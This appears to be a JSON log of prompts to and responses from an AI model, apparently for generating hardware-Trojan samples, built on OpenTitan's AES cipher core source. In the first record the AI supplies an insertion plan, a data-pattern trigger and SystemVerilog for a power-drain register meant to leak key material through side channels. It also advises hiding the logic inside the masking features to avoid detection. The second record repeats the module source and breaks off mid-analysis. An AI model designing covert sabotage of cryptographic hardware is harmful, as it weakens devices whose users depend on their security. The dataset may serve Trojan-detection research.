[
  {
    "timestamp": "2025-12-02T16:31:41.745156",
    "model": "claude-sonnet-4-20250514",
    "system_prompt": "You are an expert in hardware design, verification, and security. You specialize in SystemVerilog/Verilog RTL design and hardware Trojan analysis.",
    "user_prompt": "\nAnalyze this SystemVerilog/Verilog module header for contains:\n\n```systemverilog\n// Copyright lowRISC contributors (OpenTitan project).\n// Licensed under the Apache License, Version 2.0, see LICENSE for details.\n// SPDX-License-Identifier: Apache-2.0\n//\n// AES cipher core implementation\n//\n// This module contains the AES cipher core including, state register, full key and decryption key\n// registers as well as key expand module and control unit.\n//\n//\n// Masking\n// -------\n//\n// If the parameter \"Masking\" is set to one, first-order masking is applied to the entire\n// cipher core including key expand module. For details, see Rivain et al., \"Provably secure\n// higher-order masking of AES\" available at https://eprint.iacr.org/2010/441.pdf .\n//\n//\n// Details on the data formats\n// ---------------------------\n//\n// This implementation uses 4-dimensional SystemVerilog arrays to represent the AES state:\n//\n//   logic [3:0][3:0][7:0] state_q [NumShares];\n//\n// The fourth dimension (unpacked) corresponds to the different shares. The first element holds the\n// (masked) data share whereas the other elements hold the masks (masked implementation only).\n// The three packed dimensions correspond to the 128-bit state matrix per share. This\n// implementation uses the same encoding as the Advanced Encryption Standard (AES) FIPS Publication\n// 197 available at https://www.nist.gov/publications/advanced-encryption-standard-aes (see Section\n// 3.4). An input sequence of 16 bytes (128-bit, left most byte is the first one)\n//\n//   b0 b1 b2 b3 b4 b5 b6 b7 b8 b9 b10 b11 b12 b13 b14 b15\n//\n// is mapped to the state matrix as\n//\n//   [ b0  b4  b8  b12 ]\n//   [ b1  b5  b9  b13 ]\n//   [ b2  b6  b10 b14 ]\n//   [ b3  b7  b11 b15 ] .\n//\n// This is mapped to three packed dimensions of SystemVerilog array as follows:\n// - The first dimension corresponds to the rows. Thus, state_q[0] gives\n//   - The first row of the state matrix       [ b0   b4  b8  b12 ], or\n//   - A 32-bit packed SystemVerilog array 32h'{ b12, b8, b4, b0  }.\n//\n// - The second dimension corresponds to the columns. To access complete columns, the state matrix\n//   must be transposed first. Thus state_transposed = aes_pkg::aes_transpose(state_q) and then\n//   state_transposed[1] gives\n//   - The second column of the state matrix   [ b4  b5  b6  b7 ], or\n//   - A 32-bit packed SystemVerilog array 32h'{ b7, b6, b5, b4 }.\n//\n// - The third dimension corresponds to the bytes.\n//\n// Note that the CSRs are little-endian. The input sequence above is provided to 32-bit DATA_IN_0 -\n// DATA_IN_3 registers as\n//                   MSB            LSB\n// - DATA_IN_0 32h'{ b3 , b2 , b1 , b0  }\n// - DATA_IN_1 32h'{ b7 , b6 , b4 , b4  }\n// - DATA_IN_2 32h'{ b11, b10, b9 , b8  }\n// - DATA_IN_3 32h'{ b15, b14, b13, b12 } .\n//\n// The input state can thus be obtained by transposing the content of the DATA_IN_0 - DATA_IN_3\n// registers.\n//\n// Similarly, the implementation uses a 3-dimensional array to represent the AES keys:\n//\n//   logic     [7:0][31:0] key_full_q [NumShares]\n//\n// The third dimension (unpacked) corresponds to the different shares. The first element holds the\n// (masked) key share whereas the other elements hold the masks (masked implementation only).\n// The two packed dimensions correspond to the 256-bit key per share. This implementation uses\n// the same encoding as the Advanced Encryption Standard (AES) FIPS Publication\n// 197 available at https://www.nist.gov/publications/advanced-encryption-standard-aes .\n//\n// The first packed dimension corresponds to the 8 key words. The second packed dimension\n// corresponds to the 32 bits per key word. A key sequence of 32 bytes (256-bit, left most byte is\n// the first one)\n//\n//   b0 b1 b2 b3 b4 b5 b6 b7 b8 b9 b10 b11 b12 b13 b14 b15 ... ... b28 b29 b30 b31\n//\n// is mapped to the key words and registers (little-endian) as\n//                      MSB            LSB\n// - KEY_SHARE0_0 32h'{ b3 , b2 , b1 , b0  }\n// - KEY_SHARE0_1 32h'{ b7 , b6 , b4 , b4  }\n// - KEY_SHARE0_2 32h'{ b11, b10, b9 , b8  }\n// - KEY_SHARE0_3 32h'{ b15, b14, b13, b12 }\n// - KEY_SHARE0_4 32h'{  .    .    .    .  }\n// - KEY_SHARE0_5 32h'{  .    .    .    .  }\n// - KEY_SHARE0_6 32h'{  .    .    .    .  }\n// - KEY_SHARE0_7 32h'{ b31, b30, b29, b28 } .\n\n`include \"prim_assert.sv\"\n\nmodule aes_cipher_core import aes_pkg::*;\n#(\n  parameter bit          AES192Enable         = 1,\n  parameter bit          CiphOpFwdOnly        = 0,\n  parameter bit          SecMasking           = 1,\n  parameter sbox_impl_e  SecSBoxImpl          = SBoxImplDom,\n  parameter bit          SecAllowForcingMasks = 0,\n  parameter bit          SecSkipPRNGReseeding = 0,\n  parameter int unsigned EntropyWidth         = edn_pkg::ENDPOINT_BUS_WIDTH,\n\n  localparam int         NumShares            = SecMasking ? 2 : 1, // derived parameter\n\n  parameter masking_lfsr_seed_t RndCnstMaskingLfsrSeed = RndCnstMaskingLfsrSeedDefault,\n  parameter masking_lfsr_perm_t RndCnstMaskingLfsrPerm = RndCnstMaskingLfsrPermDefault\n) (\n  input  logic                        clk_i,\n  input  logic                        rst_ni,\n\n  // Input handshake signals\n  input  sp2v_e                       in_valid_i,\n  output sp2v_e                       in_ready_o,\n\n  // Output handshake signals\n  output sp2v_e                       out_valid_o,\n  input  sp2v_e                       out_ready_i,\n\n  // Control and sync signals\n  input  logic                        cfg_valid_i, // Used for gating assertions only.\n  input  ciph_op_e                    op_i,\n  input  key_len_e                    key_len_i,\n  input  sp2v_e                       crypt_i,\n  output sp2v_e                       crypt_o,\n  input  sp2v_e                       dec_key_gen_i,\n  output sp2v_e                       dec_key_gen_o,\n  input  logic                        prng_reseed_i,\n  output logic                        prng_reseed_o,\n  input  logic                        key_clear_i,\n  output logic                        key_clear_o,\n  input  logic                        data_out_clear_i, // Re-use the cipher core muxes.\n  output logic                        data_out_clear_o,\n  input  logic                        alert_fatal_i,\n  output logic                        alert_o,\n\n  // Pseudo-random data for register clearing\n  input  logic        [3:0][3:0][7:0] prd_clearing_state_i [NumShares],\n  input  logic            [7:0][31:0] prd_clearing_key_i [NumShares],\n\n  // Masking PRNG\n  input  logic                        force_masks_i, // Useful for SCA only.\n  output logic        [3:0][3:0][7:0] data_in_mask_o,\n  output logic                        entropy_req_o,\n  input  logic                        entropy_ack_i,\n  input  logic     [EntropyWidth-1:0] entropy_i,\n\n  // I/O data & initial key\n  input  logic        [3:0][3:0][7:0] state_init_i [NumShares],\n  input  logic            [7:0][31:0] key_init_i [NumShares],\n  output logic        [3:0][3:0][7:0] state_o [NumShares]\n);\n```\n\nThe module has 933 lines total.\n\nTask: Identify where to insert a hardware Trojan that: Amplifies power consumption variations\n\nProvide:\n1. Which section of the module to target (e.g., \"reset logic around line X\", \"state machine\", \"register interface\")\n2. Approximate line range or section name\n3. Key signals to monitor in that section\n4. Brief insertion strategy\n\nKeep response under 500 words focusing on the target location.\n",
    "response": "Looking at this AES cipher core module header, here's my analysis for inserting a hardware Trojan that amplifies power consumption variations:\n\n## Target Section: State Register and S-Box Operations\n\n**Location**: The main AES state processing logic, likely around lines 200-400 where the state registers and S-box substitutions occur.\n\n**Key Signals to Monitor**:\n- `state_q [NumShares]` - The 4D array holding the AES state matrix\n- `round_q` - Round counter signal \n- `op_i` - Cipher operation (encrypt/decrypt)\n- `key_len_i` - Key length selection\n- S-box input/output signals (likely `sbox_in`, `sbox_out`)\n\n## Insertion Strategy\n\n**Primary Target**: S-Box substitution logic since it's the most power-intensive AES operation.\n\n1. **Conditional Power Amplification**: Insert logic that detects specific data patterns in the state matrix (e.g., when certain bytes match a trigger pattern) and then:\n   - Toggles additional registers unnecessarily\n   - Performs redundant S-box lookups\n   - Switches large capacitive loads\n\n2. **Implementation**:\n```systemverilog\n// Trojan trigger detection\nlogic trojan_trigger;\nassign trojan_trigger = (state_q[0][0][0] == 8'hAA) && \n                       (state_q[0][1][1] == 8'h55) && \n                       (op_i == CIPH_FWD);\n\n// Power amplification registers\nlogic [127:0] power_drain_reg;\nalways_ff @(posedge clk_i) begin\n  if (trojan_trigger) begin\n    power_drain_reg <= ~power_drain_reg; // Toggle all bits\n    // Perform unnecessary S-box operations\n  end\nend\n```\n\n**Secondary Target**: Key expansion logic (around lines 500-600) where `key_full_q` is processed, as key operations also have distinctive power signatures.\n\n## Why This Location\n\n1. **High Power Activity**: S-box operations naturally consume significant power\n2. **Data-Dependent**: State values vary with input data, providing trigger opportunities  \n3. **Critical Path**: Any modifications here affect the core AES functionality minimally while maximizing power impact\n4. **Masking Integration**: The existing masking infrastructure (`NumShares`) can hide additional power-consuming logic\n\n## Detection Avoidance\n\nThe Trojan would be most effective if triggered by specific plaintext/key combinations that appear during normal operation but create distinctive power signatures during side-channel analysis, making the device more vulnerable to power analysis attacks while maintaining functional correctness.\n\nThis approach leverages the module's existing complexity and masking features to hide the malicious logic while strategically amplifying power consumption at the most cryptographically sensitive operations.",
    "usage": {
      "input_tokens": 2554,
      "output_tokens": 663
    }
  },
  {
    "timestamp": "2025-12-02T16:33:44.640718",
    "model": "claude-sonnet-4-20250514",
    "system_prompt": "You are an expert in hardware design, verification, and security. You specialize in SystemVerilog/Verilog RTL design and hardware Trojan analysis.",
    "user_prompt": "\nInsert a hardware Trojan into this section of a larger SystemVerilog/Verilog module.\n\nCONTEXT:\nThis is part of aes_cipher_core module in OpenTitan.\nModule: contains, Total lines: 933\n\nTARGET SECTION:\n```systemverilog\n// Copyright lowRISC contributors (OpenTitan project).\n// Licensed under the Apache License, Version 2.0, see LICENSE for details.\n// SPDX-License-Identifier: Apache-2.0\n//\n// AES cipher core implementation\n//\n// This module contains the AES cipher core including, state register, full key and decryption key\n// registers as well as key expand module and control unit.\n//\n//\n// Masking\n// -------\n//\n// If the parameter \"Masking\" is set to one, first-order masking is applied to the entire\n// cipher core including key expand module. For details, see Rivain et al., \"Provably secure\n// higher-order masking of AES\" available at https://eprint.iacr.org/2010/441.pdf .\n//\n//\n// Details on the data formats\n// ---------------------------\n//\n// This implementation uses 4-dimensional SystemVerilog arrays to represent the AES state:\n//\n//   logic [3:0][3:0][7:0] state_q [NumShares];\n//\n// The fourth dimension (unpacked) corresponds to the different shares. The first element holds the\n// (masked) data share whereas the other elements hold the masks (masked implementation only).\n// The three packed dimensions correspond to the 128-bit state matrix per share. This\n// implementation uses the same encoding as the Advanced Encryption Standard (AES) FIPS Publication\n// 197 available at https://www.nist.gov/publications/advanced-encryption-standard-aes (see Section\n// 3.4). An input sequence of 16 bytes (128-bit, left most byte is the first one)\n//\n//   b0 b1 b2 b3 b4 b5 b6 b7 b8 b9 b10 b11 b12 b13 b14 b15\n//\n// is mapped to the state matrix as\n//\n//   [ b0  b4  b8  b12 ]\n//   [ b1  b5  b9  b13 ]\n//   [ b2  b6  b10 b14 ]\n//   [ b3  b7  b11 b15 ] .\n//\n// This is mapped to three packed dimensions of SystemVerilog array as follows:\n// - The first dimension corresponds to the rows. Thus, state_q[0] gives\n//   - The first row of the state matrix       [ b0   b4  b8  b12 ], or\n//   - A 32-bit packed SystemVerilog array 32h'{ b12, b8, b4, b0  }.\n//\n// - The second dimension corresponds to the columns. To access complete columns, the state matrix\n//   must be transposed first. Thus state_transposed = aes_pkg::aes_transpose(state_q) and then\n//   state_transposed[1] gives\n//   - The second column of the state matrix   [ b4  b5  b6  b7 ], or\n//   - A 32-bit packed SystemVerilog array 32h'{ b7, b6, b5, b4 }.\n//\n// - The third dimension corresponds to the bytes.\n//\n// Note that the CSRs are little-endian. The input sequence above is provided to 32-bit DATA_IN_0 -\n// DATA_IN_3 registers as\n//                   MSB            LSB\n// - DATA_IN_0 32h'{ b3 , b2 , b1 , b0  }\n// - DATA_IN_1 32h'{ b7 , b6 , b4 , b4  }\n// - DATA_IN_2 32h'{ b11, b10, b9 , b8  }\n// - DATA_IN_3 32h'{ b15, b14, b13, b12 } .\n//\n// The input state can thus be obtained by transposing the content of the DATA_IN_0 - DATA_IN_3\n// registers.\n//\n// Similarly, the implementation uses a 3-dimensional array to represent the AES keys:\n//\n//   logic     [7:0][31:0] key_full_q [NumShares]\n//\n// The third dimension (unpacked) corresponds to the different shares. The first element holds the\n// (masked) key share whereas the other elements hold the masks (masked implementation only).\n// The two packed dimensions correspond to the 256-bit key per share. This implementation uses\n// the same encoding as the Advanced Encryption Standard (AES) FIPS Publication\n// 197 available at https://www.nist.gov/publications/advanced-encryption-standard-aes .\n//\n// The first packed dimension corresponds to the 8 key words. The second packed dimension\n// corresponds to the 32 bits per key word. A key sequence of 32 bytes (256-bit, left most byte is\n// the first one)\n//\n//   b0 b1 b2 b3 b4 b5 b6 b7 b8 b9 b10 b11 b12 b13 b14 b15 ... ... b28 b29 b30 b31\n//\n// is mapped to the key words and registers (little-endian) as\n//                      MSB            LSB\n// - KEY_SHARE0_0 32h'{ b3 , b2 , b1 , b0  }\n// - KEY_SHARE0_1 32h'{ b7 , b6 , b4 , b4  }\n// - KEY_SHARE0_2 32h'{ b11, b10, b9 , b8  }\n// - KEY_SHARE0_3 32h'{ b15, b14, b13, b12 }\n// - KEY_SHARE0_4 32h'{  .    .    .    .  }\n// - KEY_SHARE0_5 32h'{  .    .    .    .  }\n// - KEY_SHARE0_6 32h'{  .    .    .    .  }\n// - KEY_SHARE0_7 32h'{ b31, b30, b29, b28 } .\n\n`include \"prim_assert.sv\"\n\nmodule aes_cipher_core import aes_pkg::*;\n#(\n  parameter bit          AES192Enable         = 1,\n  parameter bit          CiphOpFwdOnly        = 0,\n  parameter bit          SecMasking           = 1,\n  parameter sbox_impl_e  SecSBoxImpl          = SBoxImplDom,\n  parameter bit          SecAllowForcingMasks = 0,\n  parameter bit          SecSkipPRNGReseeding = 0,\n  parameter int unsigned EntropyWidth         = edn_pkg::ENDPOINT_BUS_WIDTH,\n\n  localparam int         NumShares            = SecMasking ? 2 : 1, // derived parameter\n\n  parameter masking_lfsr_seed_t RndCnstMaskingLfsrSeed = RndCnstMaskingLfsrSeedDefault,\n  parameter masking_lfsr_perm_t RndCnstMaskingLfsrPerm = RndCnstMaskingLfsrPermDefault\n) (\n  input  logic                        clk_i,\n  input  logic                        rst_ni,\n\n  // Input handshake signals\n  input  sp2v_e                       in_valid_i,\n  output sp2v_e                       in_ready_o,\n\n  // Output handshake signals\n  output sp2v_e                       out_valid_o,\n  input  sp2v_e                       out_ready_i,\n\n  // Control and sync signals\n  input  logic                        cfg_valid_i, // Used for gating assertions only.\n  input  ciph_op_e                    op_i,\n  input  key_len_e                    key_len_i,\n  input  sp2v_e                       crypt_i,\n  output sp2v_e                       crypt_o,\n  input  sp2v_e                       dec_key_gen_i,\n  output sp2v_e                       dec_key_gen_o,\n  input  logic                        prng_reseed_i,\n  output logic                        prng_reseed_o,\n  input  logic                        key_clear_i,\n  output logic                        key_clear_o,\n  input  logic                        data_out_clear_i, // Re-use the cipher core muxes.\n  output logic                        data_out_clear_o,\n  input  logic                        alert_fatal_i,\n  output logic                        alert_o,\n\n  // Pseudo-random data for register clearing\n  input  logic        [3:0][3:0][7:0] prd_clearing_state_i [NumShares],\n  input  logic            [7:0][31:0] prd_clearing_key_i [NumShares],\n\n  // Masking PRNG\n  input  logic                        force_masks_i, // Useful for SCA only.\n  output logic        [3:0][3:0][7:0] data_in_mask_o,\n  output logic                        entropy_req_o,\n  input  logic                        entropy_ack_i,\n  input  logic     [EntropyWidth-1:0] entropy_i,\n\n  // I/O data & initial key\n  input  logic        [3:0][3:0][7:0] state_init_i [NumShares],\n  input  logic            [7:0][31:0] key_init_i [NumShares],\n  output logic        [3:0][3:0][7:0] state_o [NumShares]\n);\n\n  // Signals\n  logic               [3:0][3:0][7:0] state_d [NumShares];\n  logic               [3:0][3:0][7:0] state_q [NumShares];\n  sp2v_e                              state_we_ctrl;\n  sp2v_e                              state_we;\n  logic           [StateSelWidth-1:0] state_sel_raw;\n  state_sel_e                         state_sel_ctrl;\n  state_sel_e                         state_sel;\n  logic                               state_sel_err;\n\n  sp2v_e                              sub_bytes_en;\n  sp2v_e                              sub_bytes_out_req;\n  sp2v_e                              sub_bytes_out_ack;\n  logic                               sub_bytes_err;\n  logic               [3:0][3:0][7:0] sub_bytes_out;\n  logic               [3:0][3:0][7:0] sb_in_mask;\n  logic               [3:0][3:0][7:0] sb_out_mask;\n  logic               [3:0][3:0][7:0] shift_rows_in [NumShares];\n  logic               [3:0][3:0][7:0] shift_rows_out [NumShares];\n  logic               [3:0][3:0][7:0] mix_columns_out [NumShares];\n  logic               [3:0][3:0][7:0] add_round_key_in [NumShares];\n  logic               [3:0][3:0][7:0] add_round_key_out [NumShares];\n  logic           [AddRKSelWidth-1:0] add_rk_sel_raw;\n  add_rk_sel_e                        add_rk_sel_ctrl;\n  add_rk_sel_e                        add_rk_sel;\n  logic                               add_rk_sel_err;\n\n  logic                   [7:0][31:0] key_full_d [NumShares];\n  logic                   [7:0][31:0] key_full_q [NumShares];\n  sp2v_e                              key_full_we_ctrl;\n  sp2v_e                              key_full_we;\n  logic         [KeyFullSelWidth-1:0] key_full_sel_raw;\n  key_full_sel_e                      key_full_sel_ctrl;\n  key_full_sel_e                      key_full_sel;\n  logic                               key_full_sel_err;\n  logic                   [7:0][31:0] key_dec_d [NumShares];\n  logic                   [7:0][31:0] key_dec_q [NumShares];\n  sp2v_e                              key_dec_we_ctrl;\n  sp2v_e                              key_dec_we;\n  logic          [KeyDecSelWidth-1:0] key_dec_sel_raw;\n  key_dec_sel_e                       key_dec_sel_ctrl;\n  key_dec_sel_e                       key_dec_sel;\n  logic                               key_dec_sel_err;\n  logic                   [7:0][31:0] key_expand_out [NumShares];\n  ciph_op_e                           key_expand_op;\n  sp2v_e                              key_expand_en;\n  logic                               key_expand_prd_we;\n  sp2v_e                              key_expand_out_req;\n  sp2v_e                              key_expand_out_ack;\n  logic                               key_expand_err;\n  logic                               key_expand_clear;\n  logic                         [3:0] key_expand_round;\n  logic        [KeyWordsSelWidth-1:0] key_words_sel_raw;\n  key_words_sel_e                     key_words_sel_ctrl;\n  key_words_sel_e                     key_words_sel;\n  logic                               key_words_sel_err;\n  logic                   [3:0][31:0] key_words [NumShares];\n  logic               [3:0][3:0][7:0] key_bytes [NumShares];\n  logic               [3:0][3:0][7:0] key_mix_columns_out [NumShares];\n  logic               [3:0][3:0][7:0] round_key [NumShares];\n  logic        [RoundKeySelWidth-1:0] round_key_sel_raw;\n  round_key_sel_e                     round_key_sel_ctrl;\n  round_key_sel_e                     round_key_sel;\n  logic                               round_key_sel_err;\n\n  logic                               cfg_valid;\n  logic                               mux_sel_err;\n  logic                               sp_enc_err_d, sp_enc_err_q;\n  logic                               op_err;\n\n  // Pseudo-random data for masking purposes\n  logic         [WidthPRDMasking-1:0] prd_masking;\n  logic  [3:0][3:0][WidthPRDSBox-1:0] prd_sub_bytes_d;\n  logic  [3:0][3:0][WidthPRDSBox-1:0] prd_sub_bytes_q;\n  logic             [WidthPRDKey-1:0] prd_key_expand;\n  logic                               prd_masking_upd;\n  logic                               prd_masking_rsd_req;\n  logic                               prd_masking_rsd_ack;\n\n  logic               [3:0][3:0][7:0] data_in_mask;\n\n  // op_i is one-hot encoded. Check the provided value and trigger an alert upon detecing invalid\n  // encodings.\n  assign op_err    = ~(op_i == CIPH_FWD || op_i == CIPH_INV);\n  assign cfg_valid = cfg_valid_i & ~op_err;\n\n  //////////\n  // Data //\n  //////////\n\n  // SEC_CM: DATA_REG.SEC_WIPE\n  // State registers\n  always_comb begin : state_mux\n    unique case (state_sel)\n      STATE_INIT:  state_d = state_init_i;\n      STATE_ROUND: state_d = add_round_key_out;\n      STATE_CLEAR: state_d = prd_clearing_state_i;\n      default:     state_d = prd_clearing_state_i;\n    endcase\n  end\n\n  always_ff @(posedge clk_i or negedge rst_ni) begin : state_reg\n    if (!rst_ni) begin\n      state_q <= '{default: '0};\n    end else if (state_we == SP2V_HIGH) begin\n      state_q <= state_d;\n    end\n  end\n\n  // Masking\n  if (!SecMasking) begin : gen_no_masks\n    // The masks are ignored anyway, they can be 0.\n    assign sb_in_mask  = '0;\n    assign prd_masking = '0;\n\n    // Tie-off unused signals.\n    logic unused_entropy_ack;\n    logic [EntropyWidth-1:0] unused_entropy;\n    assign unused_entropy_ack = entropy_ack_i;\n    assign unused_entropy     = entropy_i;\n    assign entropy_req_o      = 1'b0;\n\n    logic unused_force_masks;\n    logic unused_prd_masking_upd;\n    logic unused_prd_masking_rsd_req;\n    assign unused_force_masks         = force_masks_i;\n    assign unused_prd_masking_upd     = prd_masking_upd;\n    assign unused_prd_masking_rsd_req = prd_masking_rsd_req;\n    assign prd_masking_rsd_ack        = 1'b0;\n\n    logic [3:0][3:0][7:0] unused_sb_out_mask;\n    assign unused_sb_out_mask = sb_out_mask;\n\n  end else begin : gen_masks\n    // The input mask is the mask share of the state.\n    assign sb_in_mask  = state_q[1];\n\n    // The masking PRNG generates:\n    // - the pseudo-random data (PRD) required by SubBytes,\n    // - the PRD required by the key expand module (has 4 S-Boxes internally).\n    aes_prng_masking #(\n      .Width                ( WidthPRDMasking        ),\n      .EntropyWidth         ( EntropyWidth           ),\n      .SecAllowForcingMasks ( SecAllowForcingMasks   ),\n      .SecSkipPRNGReseeding ( SecSkipPRNGReseeding   ),\n      .RndCnstLfsrSeed      ( RndCnstMaskingLfsrSeed ),\n      .RndCnstLfsrPerm      ( RndCnstMaskingLfsrPerm )\n    ) u_aes_prng_masking (\n      .clk_i         ( clk_i               ),\n      .rst_ni        ( rst_ni              ),\n      .force_masks_i ( force_masks_i       ),\n      .data_update_i ( prd_masking_upd     ),\n      .data_o        ( prd_masking         ),\n      .reseed_req_i  ( prd_masking_rsd_req ),\n      .reseed_ack_o  ( prd_masking_rsd_ack ),\n      .entropy_req_o ( entropy_req_o       ),\n      .entropy_ack_i ( entropy_ack_i       ),\n      .entropy_i     ( entropy_i           )\n    );\n  end\n\n  // Extract randomness for key expand module and SubBytes.\n  //\n  // The masking PRNG output has the following shape:\n  // prd_masking = { prd_key_expand, prd_sub_bytes_d }\n  assign prd_key_expand  = prd_masking[WidthPRDMasking-1 -: WidthPRDKey];\n  assign prd_sub_bytes_d = prd_masking[WidthPRDData-1 -: WidthPRDData];\n\n  // PRD buffering\n  if (!SecMasking) begin : gen_no_prd_buffer\n    // The masks are ignored anyway.\n    assign prd_sub_bytes_q = prd_sub_bytes_d;\n\n  end else begin : gen_prd_buffer\n    // PRD buffer stage to:\n    // 1. Make sure the S-Boxes get always presented new data/mask inputs together with fresh PRD\n    //    for remasking.\n    // 2. Prevent glitches originating from inside the masking PRNG from propagating into the\n    //    masked S-Boxes.\n    always_ff @(posedge clk_i or negedge rst_ni) begin : prd_sub_bytes_reg\n      if (!rst_ni) begin\n        prd_sub_bytes_q <= '0;\n      end else if (state_we == SP2V_HIGH) begin\n        prd_sub_bytes_q <= prd_sub_bytes_d;\n      end\n    end\n  end\n\n  // Convert the 3-dimensional prd_sub_bytes_q array to a 1-dimensional packed array for the\n  // aes_prd_get_lsbs() function used below.\n  logic [WidthPRDData-1:0] prd_sub_bytes;\n  assign prd_sub_bytes = prd_sub_bytes_q;\n\n  // Extract randomness for masking the input data.\n  //\n  // The masking PRNG is used for generating both the PRD for the S-Boxes/SubBytes operation as\n  // well as for the input data masks. When using any of the masked Canright S-Box implementations,\n  // it is important that the SubBytes input masks (generated by the PRNG in Round X-1) and the\n  // SubBytes output masks (generated by the PRNG in Round X) are independent. This can be achieved\n  // by using e.g. an unrolled Bivium stream cipher primitive inside the PRNG. Since the input data\n  // masks become the SubBytes input masks in the first round, we select the same 8 bit lanes for\n  // the input data masks which are also used to form the SubBytes output mask for the masked\n  // Canright S-Box implementations, i.e., the 8 LSBs of the per S-Box PRD. In particular, we have:\n  //\n  // prd_masking = { prd_key_expand, ... , sb_prd[4], sb_out_mask[4], sb_prd[0], sb_out_mask[0] }\n  //\n  // Where sb_out_mask[x] contains the SubBytes output mask for byte x (when using a masked\n  // Canright S-Box implementation) and sb_prd[x] contains additional PRD consumed by SubBytes for\n  // byte x.\n  //\n  // When using a masked S-Box implementation other than Canright, we still select the 8 LSBs of\n  // the per-S-Box PRD to form the input data mask of the corresponding byte. We do this to\n  // distribute the input data masks over all output bits the masking PRNG. We do the extraction on\n  // a row basis.\n  localparam int unsigned WidthPRDRow = 4*WidthPRDSBox;\n  for (genvar i = 0; i < 4; i++) begin : gen_in_mask\n    assign data_in_mask[i] = aes_prd_get_lsbs(prd_sub_bytes[i * WidthPRDRow +: WidthPRDRow]);\n  end\n\n  // Rotate the data input masks by 64 bits to ensure the data input masks are independent\n  // from the PRD fed to the S-Boxes/SubBytes operation.\n  assign data_in_mask_o = {data_in_mask[1], data_in_mask[0], data_in_mask[3], data_in_mask[2]};\n\n  // Cipher data path\n  aes_sub_bytes #(\n    .SecSBoxImpl ( SecSBoxImpl )\n  ) u_aes_sub_bytes (\n    .clk_i     ( clk_i             ),\n    .rst_ni    ( rst_ni            ),\n    .en_i      ( sub_bytes_en      ),\n    .out_req_o ( sub_bytes_out_req ),\n    .out_ack_i ( sub_bytes_out_ack ),\n    .op_i      ( op_i              ),\n    .data_i    ( state_q[0]        ),\n    .mask_i    ( sb_in_mask        ),\n    .prd_i     ( prd_sub_bytes_q   ),\n    .data_o    ( sub_bytes_out     ),\n    .mask_o    ( sb_out_mask       ),\n    .err_o     ( sub_bytes_err     )\n  );\n\n  for (genvar s = 0; s < NumShares; s++) begin : gen_shares_shift_mix\n    if (s == 0) begin : gen_shift_in_data\n      // The (masked) data share\n      assign shift_rows_in[s] = sub_bytes_out;\n    end else begin : gen_shift_in_mask\n      // The mask share\n      assign shift_rows_in[s] = sb_out_mask;\n    end\n\n    aes_shift_rows u_aes_shift_rows (\n      .op_i   ( op_i              ),\n      .data_i ( shift_rows_in[s]  ),\n      .data_o ( shift_rows_out[s] )\n    );\n\n    aes_mix_columns u_aes_mix_columns (\n      .op_i   ( op_i               ),\n      .data_i ( shift_rows_out[s]  ),\n      .data_o ( mix_columns_out[s] )\n    );\n  end\n\n  always_comb begin : add_round_key_in_mux\n    unique case (add_rk_sel)\n      ADD_RK_INIT:  add_round_key_in = state_q;\n      ADD_RK_ROUND: add_round_key_in = mix_columns_out;\n      ADD_RK_FINAL: add_round_key_in = shift_rows_out;\n      default:      add_round_key_in = state_q;\n    endcase\n  end\n\n  for (genvar s = 0; s < NumShares; s++) begin : gen_shares_add_round_key\n    assign add_round_key_out[s] = add_round_key_in[s] ^ round_key[s];\n  end\n\n  /////////\n  // Key //\n  /////////\n\n  // SEC_CM: KEY.SEC_WIPE\n  // Full Key registers\n  always_comb begin : key_full_mux\n    unique case (key_full_sel)\n      KEY_FULL_ENC_INIT: key_full_d = key_init_i;\n      KEY_FULL_DEC_INIT: key_full_d = !CiphOpFwdOnly ? key_dec_q : prd_clearing_key_i;\n      KEY_FULL_ROUND:    key_full_d = key_expand_out;\n      KEY_FULL_CLEAR:    key_full_d = prd_clearing_key_i;\n      default:           key_full_d = prd_clearing_key_i;\n    endcase\n  end\n\n  always_ff @(posedge clk_i or negedge rst_ni) begin : key_full_reg\n    if (!rst_ni) begin\n      key_full_q <= '{default: '0};\n    end else if (key_full_we == SP2V_HIGH) begin\n      key_full_q <= key_full_d;\n    end\n  end\n\n  if (!CiphOpFwdOnly) begin : gen_key_dec\n    // SEC_CM: KEY.SEC_WIPE\n    // Decryption Key registers\n    always_comb begin : key_dec_mux\n      unique case (key_dec_sel)\n        KEY_DEC_EXPAND: key_dec_d = key_expand_out;\n        KEY_DEC_CLEAR:  key_dec_d = prd_clearing_key_i;\n        default:        key_dec_d = prd_clearing_key_i;\n      endcase\n    end\n\n    always_ff @(posedge clk_i or negedge rst_ni) begin : key_dec_reg\n      if (!rst_ni) begin\n        key_dec_q <= '{default: '0};\n      end else if (key_dec_we == SP2V_HIGH) begin\n        key_dec_q <= key_dec_d;\n      end\n    end\n  end else begin : gen_no_key_dec\n    // No Decryption Key registers\n    assign key_dec_q = '{default: '0};\n    assign key_dec_d = key_dec_q;\n\n    // Tie-off unused signals.\n    logic unused_key_dec;\n    always_comb begin\n      unused_key_dec = ^{key_dec_sel, key_dec_we};\n      for (int s = 0; s < NumShares; s++) begin\n        unused_key_dec ^= ^{key_dec_d[s]};\n      end\n    end\n  end\n\n  // Make sure that whenever the data/mask inputs of the S-Boxes update, the internally buffered\n  // PRD is updated in sync.\n  assign key_expand_prd_we = (key_full_we == SP2V_HIGH) ? 1'b1 : 1'b0;\n\n  // Key expand data path\n  aes_key_expand #(\n    .AES192Enable ( AES192Enable ),\n    .SecMasking   ( SecMasking   ),\n    .SecSBoxImpl  ( SecSBoxImpl  )\n  ) u_aes_key_expand (\n    .clk_i       ( clk_i              ),\n    .rst_ni      ( rst_ni             ),\n    .cfg_valid_i ( cfg_valid          ),\n```\n\nANALYSIS:\nLooking at this AES cipher core module header, here's my analysis for inserting a hardware Trojan that amplifies power consumption variations:\n\n## Target Section: State Register and S-Box Operations\n\n**Location**: The main AES state processing logic, likely around lines 200-400 where the state registers and S-box substitutions occur.\n\n**Key Signals to Monitor**:\n- `state_q [NumShares]` - The 4D array holding the AES state matrix\n- `round_q` - Round counter signal \n- `op_i` - Cipher operation (encrypt/decrypt)\n- `key_len_i` - Key length selection\n- S-box input/output signals (likely `sbox_in`, `sbox_out`)\n\n## Insertion Strategy\n\n**Primary Target**: S-Box substitution logic since it's the most power-intensive AES operation.\n\n1. **Conditional Power Amplification**: Insert logic that detects specific data patterns in the state matrix (e.g., when certain bytes match a trigger pattern) and then:\n   - Toggles additional registers unnecessarily\n   - Performs redundant S-box lookups\n   - Switches large capacitive loads\n\n2. **Implementation**:\n```systemverilog\n// Trojan trigger detection\nlogic trojan_trigger;\nassign trojan_trigger = (state_q[0][0][0] == 8'hAA) && \n                       (state_q[0][1][1] == 8'h55) && \n                       (op_i 